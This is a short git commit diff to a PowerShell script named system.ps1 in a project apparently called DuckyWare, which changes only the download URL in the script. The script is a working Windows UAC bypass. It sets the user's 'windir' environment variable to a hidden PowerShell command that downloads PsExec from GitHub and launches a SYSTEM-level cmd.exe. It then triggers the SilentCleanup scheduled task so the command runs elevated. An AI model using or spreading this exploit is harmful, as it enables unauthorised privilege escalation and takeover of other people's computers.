e35adfe250b252769d0bbd15525b25c02ee3afc3
LordDerpyCat123 <41979025+b4ck3nd-dev@users.noreply.github.com>
2021-11-14 12:52:53 +1100

    Update system.ps1

--- sysbypass/system.ps1
+++ sysbypass/system.ps1
@@ -1,4 +1,4 @@
-$program = "powershell.exe -WindowStyle Hidden wget 'https://github.com/b4ck3nd-dev/DuckyWare/blob/main/PsExec.exe?raw=true' -OutFile psexec.exe; .\psexec.exe -s -i cmd.exe; rm psexec.exe; exit; #"
+$program = "powershell.exe -WindowStyle Hidden wget 'https://github.com/b4ck3nd-dev/DuckyWare/blob/main/sysbypass/psexec.exe?raw=true' -OutFile psexec.exe; .\psexec.exe -s -i cmd.exe; rm psexec.exe; exit; #"
 Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $program -Force
 #For x64 shell in Windows x64:
 Start-Process schtasks.exe -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
